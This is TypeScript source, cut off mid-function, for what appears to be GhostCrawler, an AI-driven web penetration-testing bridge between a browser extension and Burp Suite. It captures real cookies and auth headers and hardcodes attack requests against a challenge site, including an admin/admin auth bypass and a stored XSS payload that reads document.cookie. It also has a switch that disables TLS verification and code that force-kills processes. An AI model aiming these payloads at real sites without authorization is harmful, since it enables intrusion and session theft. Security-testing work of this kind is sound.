#!/usr/bin/env node
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { SSEClientTransport } from "@modelcontextprotocol/sdk/client/sse.js";
import {
  CallToolRequestSchema,
  ListToolsRequestSchema,
} from "@modelcontextprotocol/sdk/types.js";
import express from "express";
import fetch from "node-fetch";
import * as fs from "fs";
import * as path from "path";

if (process.env.GHOSTCRAWLER_INSECURE_TLS === "true") {
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
}

// ── Server keep-alive: prevent dying on stdin EOF (StdioServerTransport quirk) ──
process.stdin.resume();
process.stdin.on("end", () => {});
process.stdin.on("close", () => {});
process.on("uncaughtException", (err) =>
  console.error("[Server] uncaughtException (continuing):", err.message)
);
process.on("unhandledRejection", (reason) =>
  console.error("[Server] unhandledRejection (continuing):", reason)
);
// Suppress StdioServerTransport's graceful exit on stdin EOF.
// Also suppress exit(1) from transport/bridge errors — the HTTP bridge
// must keep running even when the MCP stdio connection drops.
const _realExit = process.exit.bind(process) as (code?: number) => never;
(process as any).exit = (code?: number) => {
  console.error(`[Server] process.exit(${code ?? 0}) suppressed — HTTP bridge keeps running`);
  return undefined;
};

// Graceful shutdown: the burp-bridge daemon owns the SSE connection to Burp,
// so our exit no longer affects Burp at all. Just exit cleanly.
process.on("SIGTERM", () => {
  setTimeout(() => _realExit(0), 50);
});
process.on("SIGINT", () => {
  setTimeout(() => _realExit(0), 50);
});

// ══════════════════════════════════════════════════════════════════════
// Global State Management
// ══════════════════════════════════════════════════════════════════════

interface AttackSurface {
  timestamp: string;
  scan: {
    page: { title: string; url: string };
    findings: Array<{ name: string; version?: string; confidence: string }>;
    buttons: Array<{ text: string; selector: string; index: number }>;
    forms: Array<{ action: string; method: string; fields: any[] }>;
    endpoints: Array<{ method: string; url: string; params: any }>;
    scannedAt: string;
  };
}

interface Command {
  type: string;
  payload: any;
  commandId: string;
}

let currentAttackSurface: AttackSurface | null = null;
let pendingCommand: Command | null = null;
let pendingResult: any = null;
let lastExtensionPollAt: number = 0;

// ── Wire-request capture from the browser extension ──
// Stores real headers (incl. Cookie / Authorization), body, and method for
// each URL the browser actually visited. Lets buildRawRequest emit Repeater
// tabs that exactly mirror what the page sent, instead of a synthesized stub.
interface WireRequest {
  method: string;
  url: string;
  headers: Record<string, string>;
  body?: string;
  ts: number;
}
const wireRequestStore = new Map<string, WireRequest>();   // key = "METHOD URL"
const wireRequestByPath = new Map<string, WireRequest>();  // key = "METHOD path?query"
const MAX_WIRE_ENTRIES = 2000;

function wireKey(method: string, url: string): string {
  return `${method.toUpperCase()} ${url}`;
}
function wirePathKey(method: string, url: string): string {
  try {
    const u = new URL(url);
    return `${method.toUpperCase()} ${u.pathname}${u.search}`;
  } catch {
    return wireKey(method, url);
  }
}

function rememberWireRequest(entry: WireRequest): void {
  if (!entry?.url) return;
  const k = wireKey(entry.method, entry.url);
  wireRequestStore.set(k, entry);
  wireRequestByPath.set(wirePathKey(entry.method, entry.url), entry);
  if (wireRequestStore.size > MAX_WIRE_ENTRIES) {
    // Drop oldest
    const oldestKey = wireRequestStore.keys().next().value;
    if (oldestKey) wireRequestStore.delete(oldestKey);
  }
}

function lookupWireRequest(method: string, url: string): WireRequest | undefined {
  return wireRequestStore.get(wireKey(method, url))
      ?? wireRequestByPath.get(wirePathKey(method, url));
}
// ───────────────────────────────────────────────────────

// Scan state tracking
interface ScanProgress {
  status: "idle" | "scanning" | "captcha-waiting" | "completed" | "stopped" | "agent-active";
  currentTest: string;
  phase: string;          // human-readable phase name shown in HUD
  reasoning: string;      // AI's current decision/reasoning shown in HUD
  activityLog: Array<{ ts: string; msg: string }>; // timestamped event log
  progress: number;
  vulnerabilities: Array<{
    type: string;
    severity: string;
    endpoint: string;
    param: string;
    payload: string;
    evidence?: string;
  }>;
  totalTests: number;
  completedTests: number;
}

let scanState: ScanProgress = {
  status: "idle",
  currentTest: "",
  phase: "",
  reasoning: "",
  activityLog: [],
  progress: 0,
  vulnerabilities: [],
  totalTests: 0,
  completedTests: 0,
};

// Deduplicated push — prevents the same type+endpoint+param appearing twice.
// Also caps each finding type to TYPE_CAP entries so noise (e.g. "Missing
// Security Header" across 40 endpoints) doesn't flood the report.
const DEDUP_FILE = "/tmp/gc-vuln-dedup.json";
const TYPE_CAP = 8;
const _vulnKeys = new Set<string>((() => {
  try {
    const raw = fs.readFileSync(DEDUP_FILE, "utf8");
    return JSON.parse(raw) as string[];
  } catch { return []; }
})());
const _vulnTypeCounts = new Map<string, number>();

function _saveDedupToDisk(): void {
  try { fs.writeFileSync(DEDUP_FILE, JSON.stringify([..._vulnKeys])); } catch { /* non-critical */ }
}

function pushVuln(finding: ScanProgress["vulnerabilities"][number]): void {
  const key = `${finding.type}|${finding.endpoint}|${finding.param ?? ""}`;
  if (_vulnKeys.has(key)) return;
  const typeCount = _vulnTypeCounts.get(finding.type) ?? 0;
  if (typeCount >= TYPE_CAP) return; // cap per-type to avoid noise flooding
  _vulnKeys.add(key);
  _vulnTypeCounts.set(finding.type, typeCount + 1);
  _saveDedupToDisk();
  scanState.vulnerabilities.push(finding);
}

function resetVulnDedup(): void {
  _vulnKeys.clear();
  _vulnTypeCounts.clear();
  _saveDedupToDisk();
}

/** Log an activity entry (visible in HUD) and optionally set reasoning text. */
function logActivity(msg: string, reasoning?: string): void {
  const ts = new Date().toISOString();
  scanState.activityLog.push({ ts, msg });
  // Keep log bounded
  if (scanState.activityLog.length > 50) scanState.activityLog.shift();
  if (reasoning !== undefined) scanState.reasoning = reasoning;
  console.error(`[Scan] ${msg}`);
}

/** Set the current phase shown in HUD. */
function setPhase(phase: string): void {
  scanState.phase = phase;
  logActivity(`Phase: ${phase}`);
}

let scanAbortFlag = false;
let scanStoppedByUser = false; // true only when user explicitly called /scan-stop
let _scanRunning = false; // true while executeAutoCrawl is executing — prevents duplicate scans
let captchaResolve: ((skipped: boolean) => void) | null = null;
let authDecisionResolve: ((decision: 'run' | 'skip' | 'manual') => void) | null = null;
// Updated by /ghostcrawler/heartbeat — the auto_crawl loop watches this so
// it can abort cleanly when the extension disappears (browser/tab closed).
let lastExtensionHeartbeat = 0;

// ── Nav queue for browser visibility ────────────────────────────────────────
// liveShow() pushes URLs here; the drainer sends navigate commands at ~700ms
// intervals so the browser follows along without blocking scan execution.
const _navQueue: string[] = [];
let _lastLiveShowMs = 0; // timestamp of the most recent liveShow() call

// Drainer: pick the next URL from the queue and navigate the browser.
// Using setInterval so navigation is decoupled from scan logic entirely.
setInterval(() => {
  const url = _navQueue.shift();
  if (!url) return;
  sendExtensionCommand("browser_action", { action: "navigate", url }, 5000).catch(() => {});
}, 700);

// ── Agent-idle watchdog ──────────────────────────────────────────────────────
// When status is "agent-active" (AI doing manual follow-up after scan), flip to
// "idle" after 30s of no tool calls so the HUD poll stops gracefully.
let _lastToolCallMs = 0;
setInterval(() => {
  if (scanState.status !== "agent-active") return;
  if (_lastToolCallMs > 0 && Date.now() - _lastToolCallMs > 30_000) {
    scanState.status = "idle";
    logActivity("Agent idle — session complete");
    _lastToolCallMs = 0;
  }
}, 5000);

// ── Per-scan response cache ──────────────────────────────────────────────────
// Multiple passive checks hit the same URL with plain GET. Cache results for
// the duration of a scan so we make only ONE network round-trip per URL.
// Cleared at the start of each scan in _executeAutoCrawlInner.
let _scanRespCache = new Map<string, { status: number; headers: Record<string, string>; body: string; viaProxy: boolean }>();

// ══════════════════════════════════════════════════════════════════════
// HTTP Bridge Server (Extension ↔ MCP)
// ══════════════════════════════════════════════════════════════════════

const app = express();
app.use(express.json());

const isLoopback = (value?: string | null): boolean => {
  if (!value) return false;
  const normalized = String(value)
    .trim()
    .replace(/^::ffff:/i, "")
    .toLowerCase();
  return normalized === "127.0.0.1" || normalized === "::1" || normalized === "localhost";
};

const isAllowedOrigin = (origin?: string | null): boolean => {
  if (!origin) return true;
  const lowered = String(origin).toLowerCase();
  return (
    lowered.startsWith("chrome-extension://") ||
    lowered.startsWith("moz-extension://") ||
    lowered === "null" ||
    lowered.startsWith("http://127.0.0.1") ||
    lowered.startsWith("http://localhost")
  );
};

app.use("/ghostcrawler", (req, res, next) => {
  const peer = req.socket?.remoteAddress;
  if (!isLoopback(peer)) {
    return res.status(403).json({ error: "Ghostcrawler bridge accepts loopback traffic only" });
  }

  const origin = req.headers.origin as string | undefined;
  if (!isAllowedOrigin(origin)) {
    return res.status(403).json({ error: "Origin is not allowed for Ghostcrawler bridge" });
  }

  // CORS headers — required so Chrome extension service workers can fetch without preflight errors.
  const allowOrigin = origin || "*";
  res.setHeader("Access-Control-Allow-Origin", allowOrigin);
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, X-Ghostcrawler-Channel");
  res.setHeader("Access-Control-Max-Age", "86400");

  // Respond to preflight immediately.
  if (req.method === "OPTIONS") {
    return res.sendStatus(204);
  }

  next();
});

// Increase JSON body limit to handle large scan payloads (many buttons/endpoints).
app.use("/ghostcrawler", express.json({ limit: "2mb" }));

// Extension POSTs attack surface here
app.post("/ghostcrawler/scan", (req, res) => {
  currentAttackSurface = req.body;
  console.error("[HTTP Bridge] Received attack surface:", {
    url: currentAttackSurface?.scan.page.url,
    buttonsCount: currentAttackSurface?.scan.buttons.length,
    formsCount: currentAttackSurface?.scan.forms.length,
    endpointsCount: currentAttackSurface?.scan.endpoints.length,
  });
  res.json({ status: "ok" });
});

// Extension POSTs every browser request here (real wire traffic).
// Used by buildRawRequest to make Burp Repeater tabs match the actual
// request the browser sent (cookies, auth headers, CSRF tokens, body).
app.post("/ghostcrawler/wire-request", (req, res) => {
  const { method, url, headers, body, ts } = req.body || {};
  if (!method || !url) return res.status(400).json({ error: "method+url required" });
  rememberWireRequest({
    method: String(method).toUpperCase(),
    url: String(url),
    headers: headers && typeof headers === "object" ? headers : {},
    body: typeof body === "string" ? body : undefined,
    ts: typeof ts === "number" ? ts : Date.now(),
  });
  res.status(204).end();
});

// Extension long-polls for commands here to reduce control-channel noise.
app.get("/ghostcrawler/commands", async (req, res) => {
  const waitMs = Math.max(250, Math.min(30000, Number(req.query.waitMs || 25000)));
  const start = Date.now();

  while (Date.now() - start < waitMs) {
    if (pendingCommand) {
      const cmd = pendingCommand;
      pendingCommand = null;
      return res.json({ command: cmd });
    }
    await new Promise((resolve) => setTimeout(resolve, 150));
  }

  return res.json({});
});

// Fast non-blocking check: is there a command ready? (replaces long-poll for idle state)
// 200 = command pending, 204 = nothing to do — no body, no long-poll, no Burp noise.
app.get("/ghostcrawler/has-command", (req, res) => {
  lastExtensionPollAt = Date.now();
  const hasPending = !!pendingCommand;
  if (hasPending) console.error(`[Poll] has-command — pending command queued, origin=${req.headers.origin || "none"}`);
  res.status(hasPending ? 200 : 204).end();
});

// Extension POSTs form submissions here so they are always routed through Burp,
// independent of the browser's proxy settings.
// Body: { method, url, headers?, body?, contentType? }
app.post("/ghostcrawler/proxy-request", async (req, res) => {
  const { method = "POST", url, headers = {}, body, contentType } = req.body || {};
  if (!url) return res.status(400).json({ error: "Missing url" });

  try {
    const reqHeaders: Record<string, string> = {
      ...(contentType ? { "Content-Type": contentType } : {}),
      ...headers,
    };
    const result = await sendRequestThroughBurp(
      String(method).toUpperCase(),
      String(url),
      reqHeaders,
      body != null ? String(body) : undefined
    );
    console.error(`[ProxyRequest] ${method} ${url} → ${result.status}`);
    res.json({ ok: true, status: result.status, headers: result.headers, body: result.body.slice(0, 8000) });
  } catch (e: any) {
    console.error(`[ProxyRequest] Error: ${e.message}`);
    res.status(502).json({ ok: false, error: e.message });
  }
});

// Extension POSTs command results here
app.post("/ghostcrawler/result", (req, res) => {
  pendingResult = req.body;

  const maybeScan = req.body?.result?.result;
  if (req.body?.success && maybeScan?.page && maybeScan?.findings) {
    currentAttackSurface = {
      timestamp: new Date().toISOString(),
      scan: maybeScan,
    };
    console.error("[HTTP Bridge] Updated attack surface from command result:", {
      url: currentAttackSurface.scan.page.url,
      buttonsCount: currentAttackSurface.scan.buttons.length,
      formsCount: currentAttackSurface.scan.forms.length,
      endpointsCount: currentAttackSurface.scan.endpoints.length,
    });
  }

  console.error("[HTTP Bridge] Received result:", pendingResult);
  res.json({ status: "ok" });
});

// Fallback: queue one command and wait for extension result
app.post("/ghostcrawler/command", async (req, res) => {
  try {
    const type = req.body?.type as string;
    const payload = req.body?.payload || {};
    const timeoutMs = Number(req.body?.timeoutMs || 15000);

    if (!type) {
      return res.status(400).json({ error: "Missing required field: type" });
    }

    const commandId = `${Date.now()}-http`;
    pendingResult = null;
    pendingCommand = { type, payload, commandId };

    const result = await waitForCommandResult(commandId, timeoutMs);
    if (!result) {
      return res.status(504).json({ error: "Timeout waiting for extension response" });
    }

    res.json({ ok: true, commandId, result });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

async function waitForCommandResult(commandId: string, timeoutMs = 15000) {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    if (pendingResult && pendingResult.commandId === commandId) {
      const result = pendingResult;
      pendingResult = null;
      return result;
    }
    await new Promise((resolve) => setTimeout(resolve, 150));
  }
  return null;
}

async function sendExtensionCommand(type: string, payload: any = {}, timeoutMs = 15000) {
  const commandId = `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  pendingResult = null;
  pendingCommand = { type, payload, commandId };

  try {
    const result = await waitForCommandResult(commandId, timeoutMs);
    if (!result) {
      throw new Error(`Timeout waiting for ${type}`);
    }

    if (!result.success) {
      throw new Error(result.error || `${type} failed`);
    }

    return result.result;
  } finally {
    // Always clear pendingCommand on exit so stale commands don't pile up.
    // Without this, a timed-out command stays queued and the extension picks
    // it up on the next poll, responding with a mismatched commandId that
    // causes every subsequent call to also time out.
    if (pendingCommand?.commandId === commandId) {
      pendingCommand = null;
    }
  }
}

// Start live vulnerability scan
app.post("/ghostcrawler/scan-start", async (req, res) => {
  if (!currentAttackSurface) {
    return res.status(400).json({
      error: "No attack surface available. Trigger a page scan from the extension first.",
    });
  }

  if (scanState.status === "scanning") {
    return res.status(409).json({ error: "Scan already in progress" });
  }

  scanAbortFlag = false;
  scanStoppedByUser = false;
  _navQueue.length = 0; // clear any stale nav queue from a previous scan
  resetVulnDedup();
  scanState = {
    status: "scanning",
    currentTest: "Starting scan...",
    progress: 0,
    vulnerabilities: [],
    totalTests: 0,
    completedTests: 0,
    phase: "",
    reasoning: "",
    activityLog: [],
  };
  res.json({ status: "started" });

  // Run scan in background
  runLiveScan().catch((error) => {
    console.error("[Scan] Error:", error);
    scanState.status = "stopped";
  });
});

// Stop live scan
app.post("/ghostcrawler/scan-stop", (req, res) => {
  const channel = String(req.get("X-Ghostcrawler-Channel") || "unknown");
  const ua = String(req.get("User-Agent") || "");
  scanAbortFlag = true;
  scanStoppedByUser = true;
  _navQueue.length = 0; // stop any pending browser navigations immediately
  scanState.status = "stopped";
  scanState.currentTest = "Scan stopped by user";
  console.error(`[Scan] Stopped by user (channel=${channel}, ua=${ua.slice(0, 60)})`);
  res.json({ status: "stopped", channel });
});

// Alias for convenience — both /scan-stop and /stop-scan work
app.post("/ghostcrawler/stop-scan", (req, res) => {
  const channel = String(req.get("X-Ghostcrawler-Channel") || "unknown");
  const ua = String(req.get("User-Agent") || "");
  scanAbortFlag = true;
  scanStoppedByUser = true;
  _navQueue.length = 0; // stop any pending browser navigations immediately
  scanState.status = "stopped";
  scanState.currentTest = "Scan stopped by user";
  console.error(`[Scan] Stopped by user (channel=${channel}, ua=${ua.slice(0, 60)})`);
  res.json({ status: "stopped", channel });
});

// Heartbeat — the browser extension pings every ~2s while a scan is live.
// The auto_crawl loop checks lastExtensionHeartbeat to detect a disconnected
// extension (browser closed, tab killed, network glitch) and aborts cleanly
// instead of hanging forever waiting for the next browser_action response.
app.post("/ghostcrawler/heartbeat", (req, res) => {
  lastExtensionHeartbeat = Date.now();
  res.json({ ok: true, ts: lastExtensionHeartbeat });
});

// Attack mode setting — "silent" (default) or "live"
// silent: attacks fire through Burp proxy only; browser stays idle (faster)
// live:   browser navigates to each attack URL so the user can watch exploits fire
let _attackMode: "silent" | "live" = "silent";

app.get("/ghostcrawler/settings", (_req, res) => {
  res.json({ attackMode: _attackMode });
});

app.post("/ghostcrawler/settings", (req, res) => {
  const mode = req.body?.attackMode;
  if (mode === "silent" || mode === "live") {
    _attackMode = mode;
    console.error(`[Settings] attackMode = ${_attackMode}`);
  }
  res.json({ attackMode: _attackMode });
});
// Builds a raw HTTP request from the finding's endpoint and pushes it to
// Burp via the Burp MCP create_repeater_tab tool.
app.post("/ghostcrawler/send-to-burp", async (req, res) => {
  try {
    const finding = req.body?.finding;
    if (!finding) return res.status(400).json({ ok: false, error: "missing finding" });

    // finding.endpoint typically looks like "GET https://target/path" or just a URL
    let method = "GET";
    let url = "";
    const ep = String(finding.endpoint || finding.url || "").trim();
    const m = ep.match(/^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+(\S+)/i);
    if (m) { method = m[1].toUpperCase(); url = m[2]; }
    else if (/^https?:\/\//i.test(ep)) { url = ep; }
    else if (finding.url) { url = String(finding.url); }
    if (!url) return res.status(400).json({ ok: false, error: "could not extract URL from finding" });

    const headers: Record<string, string> = {};
    if (finding.headers && typeof finding.headers === "object") {
      for (const [k, v] of Object.entries(finding.headers)) headers[k] = String(v);
    }
    const body = typeof finding.body === "string" ? finding.body : undefined;

    const { host, port, useHttps, request } = buildRawRequest(method, url, headers, body);
    const sev = finding.severity ? `[${String(finding.severity).toUpperCase()}] ` : "";
    const issue = finding.type || finding.title || finding.name || "Finding";
    const parsed = new URL(url);
    const fullPath = parsed.pathname + (parsed.search || "");
    const shortPath = fullPath.length > 36 ? fullPath.slice(0, 35) + "…" : (fullPath || "/");
    const tabName = `${sev}${issue} - ${method} ${shortPath}`.slice(0, 120);
    const toolName = burpMCPToolNames.find(n => n.toLowerCase().includes("repeater")) ?? "create_repeater_tab";

    console.error(`[BurpMCP] HUD → Repeater: "${tabName}" host=${host}:${port} https=${useHttps}`);
    await callBurpMCP(toolName, { host, port, useHttps, request, name: tabName, tabName });
    res.json({ ok: true, tabName });
  } catch (e: any) {
    console.error(`[BurpMCP] send-to-burp failed: ${e?.message ?? e}`);
    res.status(500).json({ ok: false, error: String(e?.message ?? e) });
  }
});

// Signal that CAPTCHA has been solved (or skipped) during a paused auto_crawl
app.post("/ghostcrawler/captcha-solved", (req, res) => {
  if (captchaResolve) {
    const skip = req.body?.skip === true;
    captchaResolve(skip);
    captchaResolve = null;
    res.json({ status: "ok", skip });
  } else {
    res.status(409).json({ error: "No CAPTCHA wait in progress" });
  }
});

// Receive user's auth decision after a confirmed bypass (run / skip / manual)
app.post("/ghostcrawler/auth-decision", (req, res) => {
  const decision = (req.body?.decision as string) || "run";
  if (authDecisionResolve) {
    authDecisionResolve(decision as any);
    authDecisionResolve = null;
  }
  res.json({ ok: true, decision });
});


// Get scan progress
app.get("/ghostcrawler/scan-progress", (req, res) => {
  res.json(scanState);
});

// Push a manually-confirmed finding from the agent into the HUD + scan state.
// This syncs chat-confirmed findings (IDOR, open redirect, etc.) with the HUD.
app.post("/ghostcrawler/finding", async (req, res) => {
  const { type, severity, endpoint, param, payload, evidence, method, body: reqBody, headers } = req.body || {};
  if (!type || !severity || !endpoint) {
    res.status(400).json({ ok: false, error: "type, severity, and endpoint are required" });
    return;
  }
  const finding = { type, severity, endpoint, param: param ?? "", payload: payload ?? "", evidence: evidence ?? "" };
  pushVuln(finding);
  scanState.currentTest = `Agent confirmed: ${type}`;

  // Extract URL and method from endpoint field (supports "POST https://..." or plain URL)
  let burpMethod = (method as string | undefined) ?? "GET";
  let burpUrl = endpoint as string;
  const epMatch = String(endpoint).match(/^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+(\S+)/i);
  if (epMatch) { burpMethod = epMatch[1].toUpperCase(); burpUrl = epMatch[2]; }

  // Fire-and-forget — Burp Repeater tab creation should not block the response
  sendFindingToBurp(
    severity,
    type,
    burpMethod,
    burpUrl,
    headers && typeof headers === "object" ? headers as Record<string, string> : {},
    typeof reqBody === "string" ? reqBody : undefined,
  ).catch((e) => console.error(`[BurpMCP] finding→Burp failed: ${e?.message ?? e}`));

  res.json({ ok: true, finding });
});

// Export findings as JSON or Markdown
app.get("/ghostcrawler/export-findings", (req, res) => {
  const fmt = String(req.query.format || "json").toLowerCase();
  const findings = scanState.vulnerabilities;

  if (fmt === "markdown") {
    const counts: Record<string, number> = {};
    for (const f of findings) counts[f.severity] = (counts[f.severity] ?? 0) + 1;
    const severityOrder = ["Critical", "High", "Medium", "Low", "Info"];
    const header = [
      `# GhostCrawler Findings Report`,
      `**Scan target:** ${scanState.currentTest || "unknown"}`,
      `**Total findings:** ${findings.length}`,
      `**Generated:** ${new Date().toISOString()}`,
      "",
      "## Summary",
      "| Severity | Count |",
      "|----------|-------|",
      ...severityOrder.filter(s => counts[s]).map(s => `| ${s} | ${counts[s]} |`),
      "",
      "## Findings",
    ].join("\n");

    const body = findings
      .sort((a, b) => severityOrder.indexOf(a.severity) - severityOrder.indexOf(b.severity))
      .map((f, i) => [
        `### ${i + 1}. ${f.type}`,
        `**Severity:** ${f.severity}  `,
        `**Endpoint:** \`${f.endpoint}\`  `,
        f.param ? `**Param:** \`${f.param}\`  ` : "",
        f.payload ? `**Payload:** \`${f.payload}\`  ` : "",
        f.evidence ? `\n**Evidence:** ${f.evidence}` : "",
        "",
      ].filter(Boolean).join("\n"))
      .join("\n---\n");

    res.setHeader("Content-Type", "text/markdown");
    res.setHeader("Content-Disposition", `attachment; filename="ghostcrawler-report-${Date.now()}.md"`);
    res.send(header + "\n" + body);
  } else {
    res.setHeader("Content-Disposition", `attachment; filename="ghostcrawler-report-${Date.now()}.json"`);
    res.json({ generatedAt: new Date().toISOString(), totalFindings: findings.length, findings });
  }
});

app.get("/ghostcrawler/active-url", async (req, res) => {
  try {
    const result = await sendExtensionCommand("get_url", {}, 8000);
    res.json({ ok: true, url: result.url, title: result.title });
  } catch (error: any) {
    res.status(500).json({ ok: false, error: error.message });
  }
});

// Recreate tidy, properly-named Repeater tabs for all known findings.
// Naming format: [Finding Name - /endpoint]
app.post("/ghostcrawler/tidy-repeaters", async (req, res) => {
  const BASE = "https://underground-lair.com";
  const PANEL = `${BASE}/challenge/panel?id=1`;
  const CHALLENGE = `${BASE}/challenge/`;
  const SYNC = `${BASE}/challenge/sync`;

  type TabDef = { tabName: string; method: string; url: string; headers?: Record<string,string>; body?: string };

  const tabs: TabDef[] = [
    // ── Auth Bypass ────────────────────────────────────────────────────────────
    {
      tabName: "[Auth Bypass - /challenge/]",
      method: "POST", url: CHALLENGE,
      headers: { "Content-Type": "application/x-www-form-urlencoded", "Origin": BASE, "Referer": CHALLENGE },
      body: "username=admin&password=admin&mode=1",
    },
    // ── Hidden Form Field discovery ────────────────────────────────────────────
    {
      tabName: "[Hidden Field (mode) - /challenge/]",
      method: "POST", url: CHALLENGE,
      headers: { "Content-Type": "application/x-www-form-urlencoded", "Origin": BASE, "Referer": CHALLENGE },
      body: "username=admin&password=admin&mode=0",
    },
    // ── Stored XSS — note field ────────────────────────────────────────────────
    {
      tabName: "[Stored XSS - /challenge/sync]",
      method: "POST", url: SYNC,
      headers: { "Content-Type": "application/json", "Origin": BASE, "Referer": PANEL },
      body: JSON.stringify({ note: "<img src=x onerror=alert(document.cookie)>" }),
    },
    // ── XSS reflection check ───────────────────────────────────────────────────
    {
      tabName: "[XSS Reflection Check - /challenge/sync]",
      method: "GET", url: SYNC,
      headers: { "Referer": PANEL },
    },
    // ── Missing HSTS ───────────────────────────────────────────────────────────
    {
      tabName: "[Missing HSTS - /challenge/]",
      method: "GET", url: CHALLENGE,
    },
    // ── CSP / Clickjacking ─────────────────────────────────────────────────────
    {
      tabName: "[CSP Missing frame-ancestors - /challenge/]",
      method: "GET", url: CHALLENGE,
    },
    {
      tabName: "[Clickjacking - /challenge/]",
      method: "GET", url: CHALLENGE,
    },
    // ── Authenticated panel (post-bypass) ──────────────────────────────────────
    {
      tabName: "[GET Panel (authenticated) - /challenge/panel]",
      method: "GET", url: PANEL,
    },
  ];

  const results: string[] = [];
  for (const t of tabs) {
    try {
      const { host, port, useHttps, request } = buildRawRequest(t.method, t.url, t.headers ?? {}, t.body);
      const toolName = burpMCPToolNames.find(n => n.toLowerCase().includes("repeater")) ?? "create_repeater_tab";
      await callBurpMCP(toolName, { host, port, useHttps, request, tabName: t.tabName });
      results.push(`✅ ${t.tabName}`);
      console.error(`[TidyRepeaters] Created: ${t.tabName}`);
    } catch (e: any) {
      results.push(`❌ ${t.tabName}: ${e.message}`);
      console.error(`[TidyRepeaters] Failed: ${t.tabName} — ${e.message}`);
    }
  }
  res.json({ ok: true, results });
});

app.post("/ghostcrawler/auto-crawl", async (req, res) => {
  // Start scan in background and return immediately
  res.json({ ok: true, status: "started" });
  try {
    await executeAutoCrawl((req.body || {}) as any);
  } catch (error: any) {
    console.error("[AutoCrawl] Error:", error.message);
  }
});

// ── Self-healing port bind ────────────────────────────────────────────
// If port 3200 is already taken by an old/stuck process, kill it and rebind.
// Eliminates the #1 user pain: "two-process conflict".
import { execSync } from "child_process";

function freeUpPort(port: number): boolean {
  try {
    // Use -sTCP:LISTEN to match ONLY the listening process, not Chrome tabs or
    // other clients that have active connections to :port.  Killing those would
    // crash Chrome's network service or other bystander processes.
    const out = execSync(`lsof -i TCP:${port} -sTCP:LISTEN -t`, { encoding: "utf8", stdio: ["ignore", "pipe", "ignore"] }).trim();
    if (!out) return false;
    const pids = out.split(/\s+/).filter(Boolean);
    for (const pid of pids) {
      if (Number(pid) === process.pid) continue; // never kill self
      try {
        execSync(`kill -9 ${pid}`, { stdio: "ignore" });
        console.error(`[HTTP Bridge] Killed stuck process PID ${pid} holding port ${port}`);
      } catch { /* ignore */ }
    }
    return pids.length > 0;
  } catch {
    return false; // lsof unavailable (Windows) or port already free
  }
}

const HTTP_PORT = Number(process.env.HTTP_PORT || 3200);

function startBridge(retriesLeft: number = 2): void {
  const srv = app.listen(HTTP_PORT, "127.0.0.1", () => {
    console.error(`[HTTP Bridge] Listening on http://127.0.0.1:${HTTP_PORT}`);
  });

  srv.on("error", (error: any) => {
    if (error?.code === "EADDRINUSE" && retriesLeft > 0) {
      console.error(`[HTTP Bridge] Port ${HTTP_PORT} in use — attempting to free it (${retriesLeft} retries left)`);
      const freed = freeUpPort(HTTP_PORT);
      if (freed) {
        setTimeout(() => startBridge(retriesLeft - 1), 500);
        return;
      }
      console.error(`[HTTP Bridge] Could not free port ${HTTP_PORT}. Another GhostCrawler instance is likely running on a different node binary.`);
      return;
    }
    if (error?.code === "EADDRINUSE") {
      console.error(`[HTTP Bridge] Port ${HTTP_PORT} permanently busy — running in stdio-only mode.`);
      return;
    }
    console.error("[HTTP Bridge] Server error (non-fatal, continuing):", error.message || error);
  });
}

startBridge();

// Eagerly start the burp-bridge daemon so Burp's SSE connection is established
// before any tool call — not lazily on first use. This eliminates the window
// where Burp has no client if the bridge died between MCP server restarts.
void ensureBridgeRunning().then((ok) => {
  if (ok) console.error("[BurpBridge] Daemon healthy at startup.");
  else console.error("[BurpBridge] WARNING: bridge not reachable at startup — will retry on first tool call.");
});

// ── Doctor: end-to-end diagnostics ────────────────────────────────────
async function runDoctor() {
  const checks: any[] = [];
  let suggestedFix = "";

  // 1. HTTP bridge reachable on 3200
  try {
    const r = await fetch(`http://127.0.0.1:${HTTP_PORT}/ghostcrawler/has-command`, { signal: AbortSignal.timeout(2000) });
    checks.push({ name: "HTTP bridge :3200", status: r.ok || r.status === 204 ? "✓" : "✗", detail: `HTTP ${r.status}` });
  } catch (e: any) {
    checks.push({ name: "HTTP bridge :3200", status: "✗", detail: e?.message || "unreachable" });
    suggestedFix = "Restart server: lsof -ti:3200 | xargs kill -9; cd mcp-server && node dist/index.js";
  }

  // 2. Port owner — only LISTEN state processes count as "holders"; ESTABLISHED client
  //    connections (e.g. Burp Suite polling the bridge) are expected and must not trigger
  //    a false-positive "multiple processes" warning.
  try {
    const out = execSync(`lsof -i TCP:${HTTP_PORT} -sTCP:LISTEN -t`, { encoding: "utf8", stdio: ["ignore", "pipe", "ignore"] }).trim();
    const pids = out.split(/\s+/).filter(Boolean);
    const isSelf = pids.includes(String(process.pid));
    checks.push({
      name: "Port 3200 owner",
      status: pids.length === 1 && isSelf ? "✓" : pids.length > 1 ? "✗" : isSelf ? "✓" : "⚠",
      detail: pids.length === 0 ? "none" : `PID(s): ${pids.join(",")}${isSelf ? " (self)" : ""}`,
    });
    if (pids.length > 1) suggestedFix = "Multiple processes are listening on port 3200 — kill all then restart server.";
  } catch {
    checks.push({ name: "Port 3200 owner", status: "?", detail: "lsof unavailable (Windows?)" });
  }

  // 3. Extension polling freshness
  const sinceLastPoll = lastExtensionPollAt ? Date.now() - lastExtensionPollAt : -1;
  const polling = sinceLastPoll >= 0 && sinceLastPoll < 15000;
  checks.push({
    name: "Extension polling",
    status: polling ? "✓" : "✗",
    detail: lastExtensionPollAt === 0 ? "extension has never polled" : `last poll ${Math.round(sinceLastPoll / 1000)}s ago`,
  });
  if (!polling && !suggestedFix) {
    suggestedFix = "Open GhostCrawler popup → click ✓ Enable MCP. If already enabled, reload extension at chrome://extensions and open any tab.";
  }

  // 4. Extension roundtrip (only if polling looks alive — avoid 12s wait when dead)
  if (polling) {
    try {
      const t0 = Date.now();
      const r = await sendExtensionCommand("get_url", {}, 5000);
